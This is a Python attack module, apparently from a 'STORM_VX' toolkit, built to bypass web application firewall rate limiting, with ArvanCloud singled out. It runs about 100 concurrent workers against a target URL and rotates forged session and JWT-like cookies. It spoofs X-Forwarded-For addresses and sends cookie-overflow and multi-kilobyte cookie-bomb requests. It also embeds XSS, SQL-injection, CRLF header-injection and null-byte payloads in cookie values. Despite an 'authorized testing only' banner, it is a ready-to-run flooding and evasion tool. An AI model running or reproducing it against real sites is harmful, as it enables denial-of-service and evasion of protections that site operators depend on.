#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VF Cookie Poison — Cookie Poisoning Attack Module                      ║
║  Part of the STORM_VX Toolkit                                          ║
║                                                                          ║
║  Bypasses session-based rate limiting by rotating cookies per request.  ║
║  Many WAFs (including ArvanCloud) track rate limits via cookies.        ║
║  New cookie = new "user" = new rate limit bucket.                       ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import string
import hashlib
from typing import Dict, Optional, List, Tuple
from urllib.parse import urlparse

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False


# ─── Color Codes ──────────────────────────────────────────────────────────────

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ─── User-Agent Pool ─────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


class CookiePoisonAttacker:
    """
    Cookie Poisoning Attack for bypassing session-based rate limiting.

    Many WAFs (including ArvanCloud) track rate limits via cookies.
    By generating unique cookies for each request, we create a new
    "user identity" for each request, bypassing per-user rate limits.

    Attack strategies:
    1. Cookie rotation: Generate random but valid-looking cookies
    2. Cookie removal: Send requests without cookies
    3. Cookie corruption: Send corrupted cookie values
    4. Cookie overflow: Send 50+ cookies to confuse WAF parsing
    5. Cookie size bomb: Single cookie with 8KB value

    Tracks: block rate with unique cookies vs same cookies.
    If unique cookies reduce block rate = WAF uses cookie-based rate limiting.

    ArvanCloud blocking codes: 403, 429, 500, 503
    """

    # Common cookie names used by web applications and WAFs
    COMMON_COOKIE_NAMES = [
        "sessionid", "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId",
        "_session_id", "session", "sid", "sess", "connect.sid",
        "laravel_session", "ci_session", "cakephp", "django_sessionid",
        "rack.session", "sinatra.session", "express.sid",
        "__cfduid", "_ga", "_gid", "_fbp", "_gat",
        "arvan_sess", "arvan_id", "arvan_user", "arvan_token",
        "token", "auth_token", "access_token", "refresh_token",
        "user_id", "user_session", "login_token", "remember_me",
    ]

    # ArvanCloud-specific cookie patterns
    ARVAN_COOKIES = [
        "arvancloud_sess", "arvan_id", "arvan_waf", "arvan_rate",
        "arvan_visitor", "arvan_country", "arvan_cache",
        "__arvan_uid", "__arvan_sid", "__arwan_device",
    ]

    def __init__(self, url: str, workers: int = 100, timeout: int = 15):
        self.url = url
        self.workers = workers
        self.timeout = timeout
        self.parsed = urlparse(url)
        self.host = self.parsed.hostname or ""
        self.base_url = f"{self.parsed.scheme}://{self.host}"

        # Discovered cookies from the target
        self._target_cookies: List[str] = []
        self._target_cookie_names: List[str] = []

        # Stats tracking
        self.stats = {
            "total_requests": 0,
            "unique_cookie_requests": 0,
            "same_cookie_requests": 0,
            "no_cookie_requests": 0,
            "overflow_cookie_requests": 0,
            "bombs_cookie_requests": 0,
            # Block rates by strategy
            "unique_cookie_blocked": 0,
            "same_cookie_blocked": 0,
            "no_cookie_blocked": 0,
            "overflow_cookie_blocked": 0,
            "bomb_cookie_blocked": 0,
            # Success rates
            "total_success": 0,
            "total_blocked": 0,
            "total_errors": 0,
            # Analysis
            "cookie_based_rate_limiting": None,
            "best_strategy": None,
            "target_cookies_found": [],
        }
        self._lock = asyncio.Lock()
        self._start_time = 0.0

    async def _update_stats(self, key: str, delta: int = 1):
        async with self._lock:
            self.stats[key] = self.stats.get(key, 0) + delta

    async def _get_stats(self) -> Dict:
        async with self._lock:
            return dict(self.stats)

    def _generate_session_id(self, length: int = 32) -> str:
        """Generate a random session ID that looks realistic."""
        # Mix of hex and base64-like characters
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choices(chars, k=length))

    def _generate_php_sessid(self) -> str:
        """Generate a PHP-like session ID."""
        return ''.join(random.choices(string.hexdigits[:16], k=26))

    def _generate_java_sessid(self) -> str:
        """Generate a Java-like JSESSIONID."""
        parts = []
        for _ in range(4):
            parts.append(''.join(random.choices(string.ascii_uppercase + string.digits, k=8)))
        return '-'.join(parts)

    def _generate_asp_sessid(self) -> str:
        """Generate an ASP.NET-like session ID."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=24))

    def _generate_django_sessid(self) -> str:
        """Generate a Django-like session ID."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))

    def _generate_random_cookie_value(self, cookie_name: str) -> str:
        """Generate a realistic-looking cookie value for a given name."""
        name_lower = cookie_name.lower()

        if "phpsessid" in name_lower:
            return self._generate_php_sessid()
        elif "jsessionid" in name_lower:
            return self._generate_java_sessid()
        elif "asp.net" in name_lower or "aspnet" in name_lower:
            return self._generate_asp_sessid()
        elif "django" in name_lower:
            return self._generate_django_sessid()
        elif "token" in name_lower or "auth" in name_lower:
            # JWT-like token
            header = ''.join(random.choices(string.ascii_letters + string.digits, k=36))
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
            sig = ''.join(random.choices(string.ascii_letters + string.digits, k=43))
            return f"{header}.{payload}.{sig}"
        elif "ga" in name_lower or "_ga" in name_lower:
            return f"GA1.2.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 9999999999)}"
        elif "arvan" in name_lower:
            return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        elif "session" in name_lower or "sess" in name_lower or "sid" in name_lower:
            return self._generate_session_id(random.randint(24, 40))
        else:
            return ''.join(random.choices(string.ascii_letters + string.digits + "=/+_-", k=random.randint(16, 48)))

    def _generate_unique_cookies(self) -> Dict[str, str]:
        """Generate a unique set of cookies for a single request."""
        cookies = {}

        # If we know target cookies, use those names with random values
        if self._target_cookie_names:
            for name in self._target_cookie_names:
                cookies[name] = self._generate_random_cookie_value(name)
        else:
            # Use a mix of common cookie names
            num_cookies = random.randint(1, 4)
            names = random.sample(self.COMMON_COOKIE_NAMES, min(num_cookies, len(self.COMMON_COOKIE_NAMES)))
            for name in names:
                cookies[name] = self._generate_random_cookie_value(name)

        return cookies

    def _generate_overflow_cookies(self, count: int = 50) -> Dict[str, str]:
        """Generate a large number of cookies to overflow WAF parsing.

        Many WAFs have limits on how many cookies they can parse.
        Sending 50+ cookies may cause the WAF to skip rate-limit
        tracking entirely.
        """
        cookies = {}

        # Include some real-looking cookies
        for name in random.sample(self.COMMON_COOKIE_NAMES, min(5, len(self.COMMON_COOKIE_NAMES))):
            cookies[name] = self._generate_random_cookie_value(name)

        # Fill with overflow cookies
        for i in range(count):
            cookie_name = f"c{i}_{random.randint(1000, 9999)}"
            cookie_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 32)))
            cookies[cookie_name] = cookie_value

        return cookies

    def _generate_cookie_bomb(self, size_kb: int = 8) -> Dict[str, str]:
        """Generate a single cookie with an extremely large value.

        Some WAFs crash or skip processing when cookie values are
        excessively large.
        """
        cookies = {}
        # One normal cookie
        cookies["sessionid"] = self._generate_session_id()
        # One bomb cookie
        bomb_value = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))
        cookies["data"] = bomb_value
        return cookies

    def _generate_corrupted_cookies(self) -> Dict[str, str]:
        """Generate corrupted/malformed cookie values."""
        cookies = {}
        name = random.choice(self._target_cookie_names or self.COMMON_COOKIE_NAMES)

        corruption_type = random.choice(["null_bytes", "special_chars", "sql_inject", "overflow_header", "unicode"])

        if corruption_type == "null_bytes":
            cookies[name] = "valid\x00part\x00corrupted"
        elif corruption_type == "special_chars":
            cookies[name] = "<script>alert(1)</script>; DROP TABLE--"
        elif corruption_type == "sql_inject":
            cookies[name] = "' OR '1'='1' --"
        elif corruption_type == "overflow_header":
            cookies[name] = "value\r\nX-Injected-Header: malicious"
        elif corruption_type == "unicode":
            cookies[name] = "valid_\ufffd_\u0000_\ud800_value"

        return cookies

    async def _discover_target_cookies(self, stop_event: asyncio.Event):
        """Discover what cookies the target and WAF set."""
        print(f"  {C.CY}[COOKIE-POISON] Discovering target cookies...{C.RS}")

        try:
            timeout_obj = aiohttp.ClientTimeout(total=self.timeout)
            async with aiohttp.ClientSession(timeout=timeout_obj) as session:
                headers = {
                    "User-Agent": random_ua(),
                    "Accept": "text/html,application/xhtml+xml,*/*",
                }

                async with session.get(self.url, headers=headers, ssl=False, allow_redirects=True) as resp:
                    # Extract Set-Cookie headers
                    cookies = resp.cookies
                    for name, cookie in cookies.items():
                        if name not in self._target_cookie_names:
                            self._target_cookie_names.append(name)
                        if name not in self._target_cookies:
                            self._target_cookies.append(name)
                            print(f"  {C.G}[COOKIE-POISON] Found cookie: {name}{C.RS}")

                    # Also check for cookie-like strings in response
                    body = await resp.text()
                    import re
                    cookie_mentions = re.findall(r'(?i)(?:set[_-]?cookie|document\.cookie)\s*[=:]\s*["\']?(\w+)', body[:10000])
                    for name in cookie_mentions:
                        if name not in self._target_cookie_names:
                            self._target_cookie_names.append(name)

        except Exception as e:
            print(f"  {C.Y}[COOKIE-POISON] Cookie discovery failed: {e}{C.RS}")

        # Add ArvanCloud cookies to watch list
        for name in self.ARVAN_COOKIES:
            if name not in self._target_cookie_names:
                self._target_cookie_names.append(name)

        if self._target_cookie_names:
            print(f"  {C.G}[COOKIE-POISON] Tracking {len(self._target_cookie_names)} cookie names{C.RS}")
        else:
            print(f"  {C.Y}[COOKIE-POISON] No target cookies found, using common names{C.RS}")

        async with self._lock:
            self.stats["target_cookies_found"] = self._target_cookie_names

    async def _analyze_rate_limiting(self):
        """Analyze whether WAF uses cookie-based rate limiting."""
        stats = await self._get_stats()

        unique_total = stats.get("unique_cookie_requests", 0)
        unique_blocked = stats.get("unique_cookie_blocked", 0)
        same_total = stats.get("same_cookie_requests", 0)
        same_blocked = stats.get("same_cookie_blocked", 0)

        # Need at least 20 requests per strategy for meaningful analysis
        if unique_total < 20 or same_total < 20:
            return

        unique_block_rate = unique_blocked / max(unique_total, 1)
        same_block_rate = same_blocked / max(same_total, 1)

        # If unique cookies have significantly lower block rate,
        # WAF is using cookie-based rate limiting
        if same_block_rate > 0 and unique_block_rate < same_block_rate * 0.5:
            async with self._lock:
                self.stats["cookie_based_rate_limiting"] = True
                self.stats["best_strategy"] = "unique_cookies"
        elif same_block_rate > unique_block_rate:
            async with self._lock:
                self.stats["cookie_based_rate_limiting"] = True
                self.stats["best_strategy"] = "unique_cookies"
        else:
            async with self._lock:
                self.stats["cookie_based_rate_limiting"] = False

    async def _cookie_worker(self, worker_id: int, stop_event: asyncio.Event):
        """Single worker that sends requests with various cookie strategies."""
        # Each worker cycles through strategies
        strategies = ["unique", "unique", "unique", "no_cookie", "overflow", "bomb", "corrupted"]
        strategy_index = worker_id % len(strategies)

        # Same-cookie worker uses a fixed set
        same_cookies = self._generate_unique_cookies()

        while not stop_event.is_set():
            strategy = strategies[strategy_index]

            # Generate cookies based on strategy
            if strategy == "unique":
                cookies = self._generate_unique_cookies()
                stat_prefix = "unique_cookie"
            elif strategy == "same":
                cookies = same_cookies
                stat_prefix = "same_cookie"
            elif strategy == "no_cookie":
                cookies = {}
                stat_prefix = "no_cookie"
            elif strategy == "overflow":
                cookies = self._generate_overflow_cookies(random.randint(30, 80))
                stat_prefix = "overflow_cookie"
            elif strategy == "bomb":
                cookies = self._generate_cookie_bomb(random.choice([4, 8, 16]))
                stat_prefix = "bomb_cookie"
            elif strategy == "corrupted":
                cookies = self._generate_corrupted_cookies()
                stat_prefix = "unique_cookie"  # Treat as unique for analysis
            else:
                cookies = self._generate_unique_cookies()
                stat_prefix = "unique_cookie"

            try:
                timeout_obj = aiohttp.ClientTimeout(total=self.timeout)
                async with aiohttp.ClientSession(timeout=timeout_obj, cookies=cookies) as session:
                    path = self.parsed.path or "/"
                    path += f"{'&' if '?' in path else '?'}_={random.randint(100000, 999999)}"
                    url = f"{self.base_url}{path}"

                    headers = {
                        "User-Agent": random_ua(),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.9",
                    }

                    # Add random IP headers
                    if random.random() > 0.3:
                        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

                    method = random.choice(["GET", "GET", "POST"])
                    if method == "GET":
                        async with session.get(url, headers=headers, ssl=False, allow_redirects=False) as resp:
                            status = resp.status
                    else:
                        async with session.post(url, headers=headers, data=b"test=1", ssl=False, allow_redirects=False) as resp:
                            status = resp.status

                    await self._update_stats("total_requests")
                    await self._update_stats(f"{stat_prefix}_requests")

                    if status in (403, 429, 500, 503):
                        await self._update_stats("total_blocked")
                        await self._update_stats(f"{stat_prefix}_blocked")
                    elif status < 400:
                        await self._update_stats("total_success")
                    elif status >= 500:
                        await self._update_stats("total_blocked")

            except asyncio.TimeoutError:
                await self._update_stats("total_errors")
            except aiohttp.ClientError:
                await self._update_stats("total_errors")
            except OSError:
                await self._update_stats("total_errors")
            except Exception:
                await self._update_stats("total_errors")

            # Rotate strategy
            strategy_index = (strategy_index + 1) % len(strategies)

            # Brief pause
            await asyncio.sleep(random.uniform(0.01, 0.05))

    async def _print_stats(self, stop_event: asyncio.Event):
        """Print real-time statistics."""
        while not stop_event.is_set():
            elapsed = time.time() - self._start_time
            stats = await self._get_stats()

            total = stats.get("total_requests", 0)
            success = stats.get("total_success", 0)
            blocked = stats.get("total_blocked", 0)
            rps = total / max(elapsed, 1)

            # Block rates by strategy
            unique_total = stats.get("unique_cookie_requests", 0)
            unique_blocked = stats.get("unique_cookie_blocked", 0)
            same_total = stats.get("same_cookie_requests", 0)
            same_blocked = stats.get("same_cookie_blocked", 0)
            no_total = stats.get("no_cookie_requests", 0)
            no_blocked = stats.get("no_cookie_blocked", 0)

            unique_br = (unique_blocked / max(unique_total, 1)) * 100
            same_br = (same_blocked / max(same_total, 1)) * 100
            no_br = (no_blocked / max(no_total, 1)) * 100

            cookie_rl = stats.get("cookie_based_rate_limiting")
            best = stats.get("best_strategy")

            print(
                f"{C.G}[COOKIE-POISON]{C.RS} "
                f"{C.BD}t={elapsed:.0f}s{C.RS} | "
                f"Total: {C.W}{total:,}{C.RS} ({rps:.1f}/s) | "
                f"OK: {C.G}{success:,}{C.RS} | "
                f"Blocked: {C.R}{blocked}{C.RS}"
            )

            print(
                f"  Block rates — "
                f"Unique: {C.G if unique_br < same_br else C.R}{unique_br:.1f}%{C.RS} | "
                f"Same: {C.R if same_br > unique_br else C.Y}{same_br:.1f}%{C.RS} | "
                f"NoCookie: {C.Y}{no_br:.1f}%{C.RS} | "
                f"CookieRL: {C.R if cookie_rl else C.G}{cookie_rl or 'N/A'}{C.RS} | "
                f"Best: {C.G}{best or 'N/A'}{C.RS}"
            )

            # Overflow and bomb stats
            overflow_total = stats.get("overflow_cookie_requests", 0)
            overflow_blocked = stats.get("overflow_cookie_blocked", 0)
            bomb_total = stats.get("bomb_cookie_requests", 0)
            bomb_blocked = stats.get("bomb_cookie_blocked", 0)
            if overflow_total > 0 or bomb_total > 0:
                overflow_br = (overflow_blocked / max(overflow_total, 1)) * 100
                bomb_br = (bomb_blocked / max(bomb_total, 1)) * 100
                print(
                    f"  Overflow: {C.Y}{overflow_br:.1f}%{C.RS} blocked | "
                    f"Bomb: {C.Y}{bomb_br:.1f}%{C.RS} blocked"
                )

            await self._analyze_rate_limiting()
            await asyncio.sleep(3)

    async def attack(self, stop_event: asyncio.Event, stats_callback=None) -> Dict:
        """
        Main attack entry point.

        Args:
            stop_event: Event to signal graceful shutdown.
            stats_callback: Optional callback for external stats reporting.

        Returns:
            Dict with attack statistics.
        """
        self._start_time = time.time()

        print(f"{C.BD}[COOKIE-POISON] Starting Cookie Poisoning attack{C.RS}")
        print(f"  Target: {C.CY}{self.host}{C.RS}")
        print(f"  Workers: {C.W}{self.workers}{C.RS}")
        print(f"  Timeout: {C.W}{self.timeout}s{C.RS}")
        print(f"  Strategy: Rotate cookies to bypass session-based rate limiting{C.RS}")

        # Phase 1: Discover target cookies
        if HAS_AIOHTTP:
            await self._discover_target_cookies(stop_event)
        else:
            print(f"  {C.R}[COOKIE-POISON] aiohttp not available!{C.RS}")
            return {"error": "aiohttp not available"}

        # Phase 2: Launch workers (including same-cookie control group)
        tasks = []

        # 80% of workers use cookie rotation
        rotation_workers = int(self.workers * 0.8)
        # 20% of workers use same cookies (control group)
        control_workers = self.workers - rotation_workers

        for i in range(rotation_workers):
            task = asyncio.create_task(self._cookie_worker(i, stop_event))
            tasks.append(task)

        # Control group workers — always use same cookies
        for i in range(control_workers):
            async def _control_worker(wid, se):
                """Worker that always uses the same cookies (control group)."""
                same_cookies = self._generate_unique_cookies()
                while not se.is_set():
                    try:
                        timeout_obj = aiohttp.ClientTimeout(total=self.timeout)
                        async with aiohttp.ClientSession(timeout=timeout_obj, cookies=same_cookies) as session:
                            path = self.parsed.path or "/"
                            path += f"{'&' if '?' in path else '?'}_={random.randint(100000, 999999)}"
                            url = f"{self.base_url}{path}"
                            headers = {"User-Agent": random_ua(), "Accept": "*/*"}

                            async with session.get(url, headers=headers, ssl=False, allow_redirects=False) as resp:
                                status = resp.status
                                await self._update_stats("total_requests")
                                await self._update_stats("same_cookie_requests")
                                if status in (403, 429, 500, 503):
                                    await self._update_stats("total_blocked")
                                    await self._update_stats("same_cookie_blocked")
                                elif status < 400:
                                    await self._update_stats("total_success")
                    except Exception:
                        await self._update_stats("total_errors")

                    await asyncio.sleep(random.uniform(0.01, 0.05))

            task = asyncio.create_task(_control_worker(i, stop_event))
            tasks.append(task)

        # Stats printer
        stats_task = asyncio.create_task(self._print_stats(stop_event))

        # Wait for stop signal
        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            pass

        # Cleanup
        stats_task.cancel()
        for task in tasks:
            task.cancel()

        await asyncio.gather(stats_task, *tasks, return_exceptions=True)

        # Final analysis
        await self._analyze_rate_limiting()

        # Final stats
        elapsed = time.time() - self._start_time
        final_stats = await self._get_stats()
        final_stats["elapsed_seconds"] = round(elapsed, 2)
        final_stats["requests_per_second"] = round(
            final_stats.get("total_requests", 0) / max(elapsed, 1), 2
        )

        # Calculate final block rates
        unique_total = final_stats.get("unique_cookie_requests", 0)
        unique_blocked = final_stats.get("unique_cookie_blocked", 0)
        same_total = final_stats.get("same_cookie_requests", 0)
        same_blocked = final_stats.get("same_cookie_blocked", 0)

        final_stats["unique_cookie_block_rate"] = round(
            unique_blocked / max(unique_total, 1) * 100, 2
        )
        final_stats["same_cookie_block_rate"] = round(
            same_blocked / max(same_total, 1) * 100, 2
        )

        # Determine if cookie rotation is effective
        unique_br = final_stats["unique_cookie_block_rate"]
        same_br = final_stats["same_cookie_block_rate"]
        if same_total >= 20 and unique_total >= 20:
            if unique_br < same_br:
                final_stats["cookie_rotation_effective"] = True
                final_stats["effectiveness"] = round(
                    (same_br - unique_br) / max(same_br, 1) * 100, 2
                )
            else:
                final_stats["cookie_rotation_effective"] = False
                final_stats["effectiveness"] = 0

        print(f"\n{C.BD}[COOKIE-POISON] Attack finished{C.RS}")
        print(f"  Total requests: {C.W}{final_stats.get('total_requests', 0):,}{C.RS}")
        print(f"  Successful: {C.G}{final_stats.get('total_success', 0):,}{C.RS}")
        print(f"  Blocked: {C.R}{final_stats.get('total_blocked', 0)}{C.RS}")

        print(f"  Block rate comparison:")
        print(f"    Unique cookies: {C.G}{final_stats.get('unique_cookie_block_rate', 0)}%{C.RS} blocked")
        print(f"    Same cookies:   {C.R}{final_stats.get('same_cookie_block_rate', 0)}%{C.RS} blocked")
        print(f"    No cookies:     {C.Y}{(final_stats.get('no_cookie_blocked', 0) / max(final_stats.get('no_cookie_requests', 1), 1) * 100):.1f}%{C.RS} blocked")

        cookie_rl = final_stats.get("cookie_based_rate_limiting")
        if cookie_rl is True:
            print(f"  {C.R}{C.BD}WAF USES COOKIE-BASED RATE LIMITING — Cookie rotation is effective!{C.RS}")
        elif cookie_rl is False:
            print(f"  {C.Y}WAF does NOT use cookie-based rate limiting (IP-based){C.RS}")
        else:
            print(f"  {C.DM}Insufficient data to determine rate limiting strategy{C.RS}")

        effective = final_stats.get("cookie_rotation_effective")
        if effective:
            print(f"  {C.G}Cookie rotation reduces block rate by {final_stats.get('effectiveness', 0)}%{C.RS}")

        print(f"  Target cookies found: {C.CY}{', '.join(final_stats.get('target_cookies_found', []))}{C.RS}")

        if stats_callback:
            await stats_callback(final_stats)

        return final_stats
